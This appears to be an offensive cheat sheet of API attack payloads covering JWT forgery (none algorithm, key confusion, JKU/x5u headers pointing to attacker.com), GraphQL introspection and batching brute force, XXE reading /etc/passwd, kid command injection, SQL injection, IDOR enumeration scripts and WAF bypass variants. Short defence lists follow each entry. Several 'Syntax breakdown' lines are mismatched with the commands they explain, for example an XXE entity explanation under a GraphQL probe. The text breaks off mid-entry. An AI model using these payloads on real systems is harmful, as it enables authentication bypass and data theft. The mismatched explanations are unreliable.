# API Security

_12 web payloads_

### JWT Security Vulnerabilities  `jwt-security`
_JSON Web Token security vulnerability exploitation_
Subcategory: **JWT** · tags: `jwt` `token` `authentication`

**Prerequisites:**
- Uses JWT for authentication
- The JWT configuration or validation has an issue

**Attack Chain:**

**1. Decode the JWT**
> Decode the JWT content
```
JWT format: header.payload.signature
Decode:
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d
Or use jwt.io
```
**Syntax breakdown:**
- `header` — algorithm and token type _value_
- `payload` — claim data _value_
- `signature` — signature verification _value_

**2. None algorithm attack**
> Use the None algorithm to bypass signature verification
```
Modify the header to:
{"alg":"none","typ":"JWT"}
After Base64 encoding, construct:
HEADER.PAYLOAD.
(the signature part is empty)
```
**Syntax breakdown:**
- `"alg":"none"` — specify the no-signature algorithm _value_

**3. Weak key cracking**
> Crack the weak key
```
Crack using hashcat:
hashcat -m 16500 jwt.txt wordlist.txt
Use jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
```
**Syntax breakdown:**
- `-m 16500` — hashcat JWT mode _value_

**4. Key confusion attack**
> Algorithm confusion attack
```
Change the RS256 algorithm to HS256:
{"alg":"HS256","typ":"JWT"}
Sign using the public key as the HMAC key
```
**Syntax breakdown:**
- `RS256` — RSA asymmetric algorithm _value_
- `HS256` — HMAC symmetric algorithm _value_

**5. Modify the Payload**
> Modify the JWT claims
```
Modify the user information in the payload:
{"sub":"admin","iat":1234567890}
Re-encode and sign with the known key
```
**Syntax breakdown:**
- `sub` — Subject claim, usually the user ID _value_
- `iat` — issued-at time _value_

**WAF/EDR Bypass Variants:**

**JWK/JKU header injection**
> Inject jwk (embedded key) or jku (remote key set URL) in the JWT Header pointing to an attacker-controlled key, making the server use the attacker's key to verify the signature
```
# JWK embedded public key injection:
# Embed the attacker's public key in the JWT Header:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# The server uses the JWK in the Header to verify the signature

# JKU remote key set injection:
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
# The server fetches the key from an attacker-controlled URL
```
**Syntax breakdown:**
- `# JWK embedded public key injection:` — primary command _command_
- `...` — 7 lines total _value_

**x5c certificate chain injection**
> Inject an attacker-self-signed certificate chain via the x5c header, making the server extract the public key from the certificate for verification; the attacker signs with the corresponding private key to forge any JWT
```
# Generate a self-signed certificate:
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj "/CN=attacker"

# Construct the JWT Header:
{"alg":"RS256","x5c":["ATTACKER_CERT_BASE64"]}

# Sign with the attacker's private key and place the attacker's certificate in x5c
# The server extracts the public key from x5c to verify the signature; the attacker's self-signed certificate passes

# Use jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```
**Syntax breakdown:**
- `# Generate a self-signed certificate:` — primary command _command_
- `...` — 8 lines total _value_

**Overview:** JWT (JSON Web Token) is the most commonly used authentication mechanism in modern web applications. Its security vulnerabilities include algorithm confusion (none/HS256→RS256), key brute force, unverified signature, and claim tampering, which can lead to authentication bypass and privilege escalation.

**Vulnerability Principle:** JWT security vulnerabilities: 1) the alg:none vulnerability (signature not verified) 2) HS256/RS256 algorithm confusion (using the public key as the HMAC key) 3) a weak key can be brute-forced with a dictionary 4) exp not verified, leading to never expiring 5) kid parameter injection (directory traversal/SQL injection) 6) the jku/x5u header pointing to a malicious key.

**Exploitation Method:** Complete exploitation flow:
1. Obtain the JWT Token
2. Decode and analyze the content
3. Attempt the None algorithm bypass
4. Attempt to crack the weak key
5. Modify the Payload for privilege escalation

**Defensive Measures:** Defenses:
1. Use a strong key
2. Disable the None algorithm
3. Correctly verify the signature
4. Set a reasonable expiration time
5. Use HTTPS transport

---

### GraphQL Injection Attack  `graphql-injection`
_GraphQL API injection and information disclosure attack_
Subcategory: **GraphQL** · tags: `graphql` `api` `injection` `introspection`

**Prerequisites:**
- The target uses a GraphQL API
- Unauthorized access or an injection point exists

**Attack Chain:**

**1. Probe the GraphQL endpoint**
> Probe the GraphQL endpoint
```
# Common GraphQL endpoints
/graphql
/api/graphql
/graphql/api
/query
/graphql.php

# Send a POST request
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```
**Syntax breakdown:**
- `<!ENTITY>` — entity definition _tag_
- `SYSTEM` — external entity _keyword_
- `file://` — file protocol _technique_

**2. Introspection query**
> Execute an introspection query to obtain the API structure
```
# Full introspection query
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# Use tools
gqlscan -u http://target.com/graphql
inql -t http://target.com/graphql
```
**Syntax breakdown:**
- `__schema` — obtain the entire API schema _value_
- `fields` — obtain all fields of a type _value_
- `args` — obtain field arguments _value_

**3. Batch query attack**
> Use batch queries to bypass restrictions
```
# Alias batch query
{
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  user4: user(id: 4) { name email }
}

# Batch query to bypass the rate limit
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"}
]
```
**Syntax breakdown:**
- `user1: user(id: 1)` — use an alias to query multiple users simultaneously _value_
- `[{},{},{}]` — array-form batch query _value_

**4. SQL injection**
> SQL injection in GraphQL
```
# SQL injection in GraphQL
{
  user(name: "admin' OR '1'='1") {
    id
    name
    password
  }
}

# Injection via parameter
mutation {
  createUser(input: {
    name: "test' OR 1=1--"
  }) {
    id
  }
}
```

**5. NoSQL injection**
> NoSQL injection in GraphQL
```
# MongoDB injection
{
  user(filter: {
    $or: [{name: "admin"}, {name: "root"}]
  }) {
    name
    password
  }
}

# Injection via JSON
{
  search(text: "{\"$ne\": \"\"}") {
    results
  }
}
```
**Syntax breakdown:**
- `$or` — MongoDB logical operator _variable_
- `$ne` — not-equal operator _variable_

**6. Information disclosure**
> Obtain hidden fields and sensitive information
```
# Obtain hidden fields
{
  user(id: 1) {
    name
    email
    password
    apiKey
    secretKey
    token
    __typename
  }
}

# Enumerate all possible fields
{
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
**Syntax breakdown:**
- `__typename` — obtain the object type name _value_
- `__type` — query information about a specific type _value_

**WAF/EDR Bypass Variants:**

**Field suggestion bypass**
> Use field suggestions and fragment enumeration
```
# Use the field suggestion feature
query {
  userr(id: 1) { name }
}
# Returns: Did you mean "user"?

# Enumerate hidden fields
query {
  user(id: 1) {
    __typename
    ...on AdminUser {
      adminSecret
    }
  }
}
```
**Syntax breakdown:**
- `...on AdminUser` — GraphQL inline fragment _value_

**Directive injection**
> Use GraphQL directives to bypass
```
# Use a directive to bypass
query {
  user(id: 1) @deprecated {
    name
  }
}

# Custom directive attack
mutation @skip(if: false) {
  deleteUser(id: 1)
}
```
**Syntax breakdown:**
- `@deprecated` — deprecation directive _value_
- `@skip` — conditional skip directive _value_

**Overview:** GraphQL injection attacks use the flexibility of the GraphQL query language for information disclosure and data manipulation, including deeply nested queries (DoS), field suggestion leaking Schema information, variable injection to bypass query restrictions, and batch queries via aliases.

**Vulnerability Principle:** GraphQL-specific vulnerabilities: 1) nested query DoS (deep nesting causes exponential database queries) 2) field suggestion leakage (on a typo, similar field names are returned) 3) alias batch queries (query thousands of records in a single request) 4) variable type mismatch to bypass input validation 5) directive injection (@skip/@include abuse).

**Exploitation Method:** Complete exploitation flow:
1. Probe the GraphQL endpoint
2. Execute an introspection query to obtain the API structure
3. Analyze sensitive fields and operations
4. Construct an injection payload
5. Use batch queries to bypass restrictions

**Defensive Measures:** Defenses:
1. Disable introspection in production
2. Enforce input validation
3. Limit query depth and complexity
4. Enforce authentication and authorization
5. Limit batch queries

---

### GraphQL Introspection Attack  `graphql-introspection`
_Use the GraphQL introspection feature to obtain the API structure_
Subcategory: **GraphQL Introspection** · tags: `graphql` `introspection` `enumeration` `api`

**Prerequisites:**
- The target uses GraphQL
- The introspection feature is not disabled

**Attack Chain:**

**1. Basic introspection**
> Basic introspection query
```
# Obtain all types
{
  __schema {
    types {
      name
    }
  }
}

# Obtain the query type
{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
  }
}
```
**Syntax breakdown:**
- `__schema` — GraphQL metadata root _value_
- `queryType` — obtain all query operations _value_

**2. Full introspection**
> Full introspection query to obtain all information
```
# Obtain the complete API structure
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
```
**Syntax breakdown:**
- `fragment` — GraphQL fragment definition _value_
- `includeDeprecated` — include deprecated fields _encoding_

**3. Analyze with tools**
> Analyze GraphQL with tools
```
# GraphQL Voyager - visual analysis
# https://github.com/APIs-guru/graphql-voyager

# Use a CLI tool
npm install -g graphql-cli
graphql-cli introspect http://target.com/graphql

# InQL scan
pip install inql
inql -t http://target.com/graphql

# GraphQL Cop
npm install -g graphql-cop
graphql-cop -t http://target.com/graphql
```

**WAF/EDR Bypass Variants:**

**Bypass introspection disabling**
> Bypass introspection disabling detection
```
# Some implementations only check a specific string
# Try different formats
query { __schema { types { name } } }
query IntrospectionQuery { __schema { types { name } } }
{"query":"{__schema{types{name}}}"

# Use a GET request
curl "http://target.com/graphql?query={__schema{types{name}}}"
```

**Overview:** GraphQL Introspection is the built-in Schema self-description feature in the GraphQL specification, allowing a client to query the API's complete type system, field definitions, and parameter information. When not disabled in production, it leaks all API structure information.

**Vulnerability Principle:** GraphQL introspection obtains via __schema/__type queries: all type (Types) and field (Fields) definitions, the complete interface of Query/Mutation/Subscription, field parameters and return types, enum values, interfaces and union types, and so on, equivalent to leaking the complete API documentation.

**Exploitation Method:** Complete exploitation flow:
1. Send an introspection query
2. Analyze the returned API structure
3. Identify sensitive operations and fields
4. Construct a malicious query

**Defensive Measures:** Defending against GraphQL introspection leakage: disable introspection queries in production (most GraphQL frameworks support configuration), enforce access control on __schema/__type queries (only allow administrators), use a query allowlist (Persisted Queries) to restrict executable queries, and deploy a GraphQL gateway for query analysis.

---

### GraphQL Batch Query Attack  `graphql-batching`
_Use GraphQL batch queries to bypass the rate limit_
Subcategory: **GraphQL Batch Query** · tags: `graphql` `batching` `rate-limit` `bypass`

**Prerequisites:**
- The target uses GraphQL
- A rate limit exists

**Attack Chain:**

**1. Alias batch query**
> Use an alias batch query
```
# Use aliases to query multiple users at once
query {
  user1: user(id: 1) { name email password }
  user2: user(id: 2) { name email password }
  user3: user(id: 3) { name email password }
  user4: user(id: 4) { name email password }
  user5: user(id: 5) { name email password }
}

# Bulk enumeration
query {
  users: allUsers(limit: 1000) { id name email }
}
```
**Syntax breakdown:**
- `user1: user(id: 1)` — alias definition _value_
- `limit: 1000` — limit the number returned _value_

**2. Array batch query**
> Use an array batch query
```
# Send multiple queries as an array
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"},
  {"query": "{ user(id: 4) { name } }"}
]

# Send using curl
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]'
```
**Syntax breakdown:**
- `[{},{},{}]` — JSON array format _value_
- `query` — GraphQL query field _value_

**3. Brute force**
> Batch brute force
```
# Batch password attempts
mutation {
  attempt1: login(email: "admin@test.com", password: "password1") { token }
  attempt2: login(email: "admin@test.com", password: "password2") { token }
  attempt3: login(email: "admin@test.com", password: "password3") { token }
  attempt4: login(email: "admin@test.com", password: "password4") { token }
  attempt5: login(email: "admin@test.com", password: "password5") { token }
}

# Enumerate users
query {
  check1: userExists(email: "admin@test.com")
  check2: userExists(email: "root@test.com")
  check3: userExists(email: "test@test.com")
}
```
**Syntax breakdown:**
- `login` — login mutation _value_
- `userExists` — user existence check query _value_

**WAF/EDR Bypass Variants:**

**Bypass batch limits**
> Bypass batch query limits
```
# Distribute queries
# Use a different query format
query BatchQuery {
  user1: user(id: 1) { ...UserFields }
  user2: user(id: 2) { ...UserFields }
}
fragment UserFields on User {
  name
  email
}

# Use variables for batching
query GetUser($ids: [ID!]!) {
  users(ids: $ids) {
    name
    email
  }
}
```
**Syntax breakdown:**
- `query{...}` — GraphQL query _format_

**Overview:** GraphQL Batching allows sending multiple query operations in a single HTTP request. An attacker can use this feature to bypass request-frequency-based rate limits, perform brute force (OTP/password), or launch bulk data queries.

**Vulnerability Principle:** GraphQL batch query attacks: 1) send thousands of mutation operations in one request to brute-force OTP/passwords (bypassing request-level rate limits) 2) use aliases to batch-query different users' data in a single query 3) array-form batch queries ([{query1},{query2},...]) to evade authentication retry detection.

**Exploitation Method:** Complete exploitation flow:
1. Test whether batch queries are supported
2. Use aliases or arrays for batch queries
3. Bypass the rate limit
4. Batch-enumerate or brute-force

**Defensive Measures:** Defenses:
1. Limit the number of batch queries
2. Rate-limit based on query complexity
3. Enforce a query depth limit
4. Monitor abnormal query patterns

---

### REST API Security Testing  `rest-api-security`
_REST API security testing and vulnerability exploitation_
Subcategory: **REST API** · tags: `rest` `api` `security` `testing`

**Prerequisites:**
- The target uses a REST API
- Understanding of the API endpoints

**Attack Chain:**

**1. API endpoint discovery**
> Discover API endpoints
```
# Common API endpoints
/api/v1/users
/api/v2/products
/api/docs
/api/swagger.json
/api/openapi.json
/swagger-ui.html
/redoc

# Discover using tools
ffuf -u http://target.com/api/FUZZ -w api_endpoints.txt
wfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ
```
**Syntax breakdown:**
- `/api/v1/` — API version path _value_
- `/swagger.json` — Swagger documentation _path_

**2. Authentication testing**
> Test API authentication
```
# Test unauthorized access
curl http://target.com/api/v1/users

# Test JWT
curl -H "Authorization: Bearer TOKEN" http://target.com/api/v1/users

# Test API Key
curl -H "X-API-Key: key123" http://target.com/api/v1/users

# Test Basic Auth
curl -u user:pass http://target.com/api/v1/users
```
**Syntax breakdown:**
- `Authorization: Bearer` — Bearer Token authentication _header_
- `X-API-Key` — API Key authentication header _value_

**3. HTTP method testing**
> Test HTTP methods
```
# Test the allowed HTTP methods
curl -X OPTIONS http://target.com/api/v1/users -v

# Attempt PUT to modify
curl -X PUT -H "Content-Type: application/json" \
  -d '{"name":"hacked"}' http://target.com/api/v1/users/1

# Attempt DELETE to delete
curl -X DELETE http://target.com/api/v1/users/1

# Attempt PATCH for partial update
curl -X PATCH -H "Content-Type: application/json" \
  -d '{"role":"admin"}' http://target.com/api/v1/users/1
```
**Syntax breakdown:**
- `OPTIONS` — obtain the supported HTTP methods _method_
- `PUT` — create or replace a resource _method_
- `PATCH` — partially update a resource _method_

**4. Parameter pollution**
> Test parameter pollution
```
# Parameter pollution test
# Duplicate parameters
/api/users?id=1&id=2
/api/users?name=admin&name=user

# Array parameters
/api/users?id[]=1&id[]=2
/api/users?name[0]=admin&name[1]=user

# JSON injection
/api/users?filter={"role":"admin"}
/api/users?sort=role&order=desc; SELECT SLEEP(5)--
```
**Syntax breakdown:**
- `id=1&id=2` — duplicate parameters _value_
- `id[]=1` — array parameter _value_

**5. Content type testing**
> Test content type handling
```
# Test different Content-Types
curl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" http://target.com/api/users
curl -H "Content-Type: text/plain" -d "name=test" http://target.com/api/users
curl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" http://target.com/api/users

# XML external entity
curl -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' \
  http://target.com/api/users
```
**Syntax breakdown:**
- `Content-Type` — HTTP content type header _value_
- `application/xml` — XML format _value_

**WAF/EDR Bypass Variants:**

**API version bypass**
> Use a different API version to bypass
```
# Try different API versions
/api/v1/users  # May be fixed
/api/v2/users  # May not be fixed
/api/users     # An old version may have no protection

# Try internal APIs
/internal/api/users
/private/api/users
/_api/users
```
**Syntax breakdown:**
- `# Try different API versions
/api/v1/users  # May be fixed
/api/v2/users  # May not be fixed
/api/users     # An old version` — attack payload _value_

**Encoding bypass**
> Use encoding to bypass
```
# URL encoding
curl http://target.com/api/users/%31  # /users/1

# Unicode encoding
curl http://target.com/api/users/%u0031

# Double URL encoding
curl http://target.com/api/users/%2531
```
**Syntax breakdown:**
- `# URL encoding
curl http://target.com/api/users/%31  # /users/1

# Unicode encoding
curl h` — attack payload _value_

**Overview:** REST API security testing focuses on issues such as authentication/authorization flaws, insufficient input validation, excessive response data exposure, and missing rate limits. As the core of modern applications, the security of an API directly affects the data security of the entire business system.

**Vulnerability Principle:** Common REST API vulnerabilities: 1) missing authentication (API endpoints accessible without authentication) 2) BOLA/IDOR (accessing others' resources by iterating over IDs) 3) Mass Assignment (submitting extra fields to modify permissions) 4) excessive data exposure (the response contains unnecessary sensitive fields) 5) lack of rate limiting.

**Exploitation Method:** Complete exploitation flow:
1. Discover API endpoints and documentation
2. Test the authentication mechanism
3. Test HTTP methods
4. Test parameter handling
5. Test content types
6. Find injection points

**Defensive Measures:** Defenses:
1. Enforce strict authentication and authorization
2. Restrict HTTP methods
3. Input validation and filtering
4. Rate limiting
5. API version management
6. Secure CORS configuration

---

### JWT None Algorithm Attack  `jwt-none-alg`
_Use the JWT None algorithm to bypass signature verification_
Subcategory: **JWT Security** · tags: `jwt` `none` `algorithm` `bypass`

**Prerequisites:**
- The target uses JWT authentication
- The server does not correctly validate the algorithm

**Attack Chain:**

**1. Decode the JWT**
> Decode the JWT token
```
# Online decoding
https://jwt.io

# Use the command line
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d

# Use Python
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
```
**Syntax breakdown:**
- `HEADER` — JWT header, contains algorithm information _value_
- `PAYLOAD` — JWT payload, contains user data _value_

**2. Construct a None algorithm Token**
> Construct a None algorithm Token
```
# Change the header to the none algorithm
# Original header
{"alg":"HS256","typ":"JWT"}

# Change to
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# Construct using Python
import base64, json
header = {"alg":"none","typ":"JWT"}
payload = {"sub":"admin","iat":1516239022}
token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=") + "." + \
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") + "."
print(token)
```
**Syntax breakdown:**
- `"alg":"none"` — set the algorithm to none _value_
- `rstrip("=")` — remove the Base64 padding _value_

**3. Modify user permissions**
> Modify user permissions
```
# Modify the payload for privilege escalation
# Original payload
{"sub":"user","role":"user","iat":1516239022}

# Change to
{"sub":"admin","role":"admin","iat":1516239022}

# Complete attack
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip("=")
token = header + "." + payload + "."
print(token)
```
**Syntax breakdown:**
- `"role":"admin"` — change the role to administrator _value_
- `"sub":"admin"` — change the subject to admin _value_

**4. Send the malicious Token**
> Send the malicious Token
```
# Send using curl
curl -H "Authorization: Bearer <MALICIOUS_TOKEN>" http://target.com/api/admin

# Empty signature test
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." http://target.com/api/admin
```
**Syntax breakdown:**
- `Bearer` — Bearer authentication scheme _value_
- `.` — empty signature part _value_

**WAF/EDR Bypass Variants:**

**Algorithm confusion**
> Try algorithm variants
```
# Try different variants
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":""}
{"alg":null}

# Remove the alg field
{"typ":"JWT"}
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Try different variants
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":""}
{"alg":null}

# Remove the alg field
{"typ":"JWT"}` — parameters and payload content _value_

**Signature bypass**
> Signature bypass variants
```
# Empty signature
header.payload.

# Arbitrary signature
header.payload.anysignature

# Use the original signature
# Some libraries ignore signature verification
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Empty signature
header.payload.

# Arbitrary signature
header.payload.anysignature

# Use the original signature
# Some libraries ignore signature verification` — parameters and payload content _value_

**Overview:** The JWT None algorithm attack uses the fact that some JWT libraries accept a Token with the alg field set to "none" (indicating no signature verification is required). An attacker changes the Token's algorithm to none and removes the signature part, tampers with the claims in the payload (such as escalating the role), and then bypasses authentication.

**Vulnerability Principle:** JWT None algorithm vulnerability: 1) change the alg in the Header to "none"/"None"/"NONE"/"nOnE" and other variants 2) remove the third part (signature) of the Token or set it empty 3) modify the user role/ID/permission claims in the Payload 4) re-Base64-encode and send. A library supporting the none algorithm will skip signature verification.

**Exploitation Method:** Complete exploitation flow:
1. Obtain a valid JWT Token
2. Decode and analyze the Token structure
3. Change the algorithm to none
4. Modify the payload for privilege escalation
5. Remove or retain an empty signature
6. Send the malicious Token

**Defensive Measures:** Defenses:
1. Disable the none algorithm
2. Strictly validate the algorithm type
3. Use a mature JWT library
4. Verify the signature is not empty
5. Set a token expiration time

---

### JWT Key Confusion Attack  `jwt-key-confusion`
_Use JWT algorithm confusion to achieve signature bypass_
Subcategory: **JWT Security** · tags: `jwt` `algorithm` `confusion` `rs256`

**Prerequisites:**
- The target uses the RS256 algorithm
- The public key can be obtained

**Attack Chain:**

**1. Obtain the public key**
> Obtain the JWT public key
```
# Obtain from the certificate
curl -k https://target.com/.well-known/jwks.json

# Obtain from the SSL certificate
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

# Obtain from the JWT header
# Decode the JWT header, look for the x5c or jku field

# Common public key locations
/.well-known/jwks.json
/api/keys
/public.key
/pubkey.pem
```
**Syntax breakdown:**
- `jwks.json` — JSON Web Key Set _path_
- `x5c` — X.509 certificate chain _value_

**2. Algorithm confusion attack**
> Algorithm confusion attack
```
# Change RS256 to HS256
# Use the public key as the HMAC key

import jwt
import base64

# Obtain the public key
public_key = open("public.pem").read()

# Construct the payload
payload = {"sub":"admin","role":"admin"}

# Sign using the public key as the HMAC key
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```
**Syntax breakdown:**
- `RS256` — RSA signature algorithm _value_
- `HS256` — HMAC signature algorithm _value_
- `public key as the key` — use the public key as the HMAC key _value_

**3. Send the malicious Token**
> Send the malicious Token
```
# Use the constructed Token
curl -H "Authorization: Bearer <HS256_TOKEN>" http://target.com/api/admin

# Python script
import requests
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://target.com/api/admin", headers=headers)
print(response.text)
```
**Syntax breakdown:**
- `curl` — HTTP request tool _command_
- `-H` — custom request header _parameter_
- `Authorization` — authentication header _header_

**WAF/EDR Bypass Variants:**

**kid injection**
> Injection via the kid parameter
```
# kid parameter injection
# Modify the kid field of the JWT header
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}

# SQL injection kid
{"alg":"HS256","typ":"JWT","kid":"key UNION SELECT secret--"}

# Command injection kid
{"alg":"HS256","typ":"JWT","kid":"|/bin/bash -c id"}
```
**Syntax breakdown:**
- `kid` — Key ID, specifies the key to use _value_

**jku/x5u bypass**
> Bypass via jku/x5u
```
# jku points to the attacker's server
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json"}

# x5u points to the attacker's certificate
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}

# Host the malicious key on the attacker's server
```
**Syntax breakdown:**
- `jku` — JWK Set URL _value_
- `x5u` — X.509 URL _value_

**Overview:** The JWT Key Confusion (Algorithm Confusion) attack changes the RS256 (asymmetric) signature to HS256 (symmetric), then uses the public key (usually obtainable) as the HMAC key to sign the Token. If the server uses the same key variable for verification, the attack succeeds.

**Vulnerability Principle:** The principle of the JWT key confusion attack: RS256 uses the private key to sign / the public key to verify, and HS256 uses a shared key to sign/verify. When the server code uses a generic "key" variable (storing the public key) for verification, the attacker changes the alg to HS256 and signs the Token with the public key (obtainable from /jwks.json or the X.509 certificate) to pass verification.

**Exploitation Method:** Complete exploitation flow:
1. Obtain the target public key
2. Change the algorithm from RS256 to HS256
3. Sign using the public key as the HMAC key
4. Send the malicious Token

**Defensive Measures:** Defenses:
1. Explicitly specify the allowed algorithms
2. Do not trust the alg field in the JWT
3. Use allowlist validation of the algorithm
4. Separate the public-key and symmetric-key verification logic

---

### IDOR Insecure Direct Object Reference  `api-idor`
_Use the IDOR vulnerability to access unauthorized resources_
Subcategory: **IDOR** · tags: `idor` `api` `authorization` `bypass`

**Prerequisites:**
- The target uses IDs to reference resources
- An authorization check flaw exists

**Attack Chain:**

**1. Identify the ID parameter**
> Identify the ID parameter
```
# Common ID parameter locations
/api/users/123
/api/orders?id=123
/api/documents/abc-123
/api/profile?user_id=123

# Observe the response
# Record the data differences returned by different IDs
```
**Syntax breakdown:**
- `/users/123` — the ID in the URL path _value_
- `?id=123` — the ID in the query parameter _value_

**2. Enumerate IDs**
> Enumerate ID values
```
# Numeric ID enumeration
for i in $(seq 1 1000); do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/users/$i" >> output.txt
done

# Use Burp Intruder
# Payload: Numbers 1-10000
# GET /api/users/{id}

# UUID enumeration
# Use ffuf
ffuf -u http://target.com/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bearer TOKEN"
```
**Syntax breakdown:**
- `seq 1 1000` — generate numbers 1 to 1000 _value_
- `ffuf` — web fuzzing tool _command_

**3. Bulk detection**
> Bulk detect IDOR
```
# Python script for bulk detection
import requests

token = "YOUR_TOKEN"
for i in range(1, 100):
    r = requests.get(
        f"http://target.com/api/users/{i}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200:
        print(f"ID {i}: {r.json()}")

# Detect data leakage
# Compare the responses of different users accessing the same ID
```
**Syntax breakdown:**
- `Authorization` — authentication header _header_

**4. Cross-user access**
> Cross-user access testing
```
# Attempt to access another user's data
# Use user A's Token to access user B's data

# Modify the ID in the request
GET /api/users/2  # Originally user 1
GET /api/orders?user_id=2  # Originally user_id=1

# Modify the POST/PUT request body
{
  "user_id": 2,  # Change to another user's ID
  "amount": 1000
}
```
**Syntax breakdown:**
- `user_id` — the user ID in the request body _value_

**WAF/EDR Bypass Variants:**

**ID variant bypass**
> ID variant bypass
```
# Numeric variants
/api/users/001
/api/users/1
/api/users/0x1
/api/users/1.0

# Encoding bypass
/api/users/%31  # URL encoding
/api/users/MSAg  # Base64 encoding

# Array bypass
/api/users?id[]=1&id[]=2
/api/users[0]=1&users[1]=2
```
**Syntax breakdown:**
- `%xx` — URL encoding _encoding_
- `base64` — Base64 encoding _encoding_

**Parameter pollution**
> Parameter pollution bypass
```
# Parameter pollution
/api/users?id=1&id=2
/api/users?id=2&id=1

# JSON injection
{"id": 1, "id": 2}

# Batch operation
/api/users/batch?ids=1,2,3,4,5
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Parameter pollution
/api/users?id=1&id=2
/api/users?id=2&id=1

# JSON injection
{"id": 1, "id": 2}

# Batch operation
/api/users/batch?ids=1,2,3,4,5` — parameters and payload content _value_

**Overview:** IDOR (Insecure Direct Object Reference) is the most common high-risk vulnerability in APIs. By modifying the object identifier in the request (user ID/order number/filename), an attacker accesses or manipulates other users' resources.

**Vulnerability Principle:** Manifestations of the IDOR vulnerability: 1) horizontal privilege escalation (GET /api/users/1001 → /api/users/1002 to view another user's profile) 2) vertical privilege escalation (an ordinary user accessing the admin interface) 3) missing object-level authorization (modifying/deleting another user's resource) 4) predictable IDs (auto-increment numbers/UUIDs can be enumerated) 5) bulk IDOR (iterating to export data).

**Exploitation Method:** Complete exploitation flow:
1. Identify API endpoints that use IDs
2. Test using your own account
3. Enumerate other ID values
4. Verify whether other users' data can be accessed
5. Bulk-enumerate sensitive data

**Defensive Measures:** Defenses:
1. Enforce object-level authorization checks
2. Use unpredictable IDs (UUIDs)
3. Verify the user's ownership of the resource
4. Log abnormal access patterns
5. Enforce rate limiting

---

### API Rate Limit Bypass  `api-rate-limit`
_Bypass the API rate limit to perform a brute-force attack_
Subcategory: **Rate Limiting** · tags: `api` `rate-limit` `bypass` `brute-force`

**Prerequisites:**
- The target has a rate limit
- The rate limit implementation has a flaw

**Attack Chain:**

**1. Detect the rate limit**
> Detect the rate limit
```
# Quickly send requests to detect the limit
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" http://target.com/api/test
done

# Observe the response
# 429 Too Many Requests
# 403 Forbidden
# Custom error message
```
**Syntax breakdown:**
- `429` — HTTP status code, too many requests _value_
- `%{http_code}` — curl outputs the HTTP status code _variable_

**2. IP bypass**
> Use IP headers to bypass
```
# X-Forwarded-For bypass
